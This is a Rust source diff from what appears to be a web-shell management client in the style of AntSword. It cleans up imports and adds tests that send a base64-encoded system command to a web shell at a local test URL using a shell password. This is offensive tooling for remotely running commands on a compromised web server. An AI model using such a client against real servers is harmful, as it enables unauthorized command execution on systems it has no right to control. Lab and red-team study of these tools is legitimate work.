@@ -3,14 +3,6 @@ use rand::{thread_rng, Rng};
 use regex::Regex;
 use reqwest::{self, Client};
 
-// pub mod crate::utils;
-
-// use mini_antsword_ts::encode;
-// use mini_antsword_ts::request;
-
-// use utils::encode;
-// use utils::request;
-
 use crate::utils::encode;
 use crate::utils::request;
 
@@ -65,5 +57,27 @@ pub async fn echo_base64_encode_system_command<E: AsRef<str>>(
             std::io::ErrorKind::Other,
             "Error in matching pattern.",
         ))),
+    }
+}
+
+#[cfg(test)]
+mod test {
+
+    use super::*;
+
+    const URL: &str = "http://127.0.0.1/webshell.php";
+    const KEY: &str = "1";
+
+    #[test]
+    fn test_rand() {
+        println!("{:?}", gen_random_key());
+    }
+
+    #[tokio::test]
+    async fn test_echo_system_command() -> Result<(), Box<dyn std::error::Error>> {
+        let text =
+            echo_base64_encode_system_command(URL.to_string(), KEY, "dir".to_string()).await?;
+        println!("{:?}", text);
+        Ok(())
     }
 }
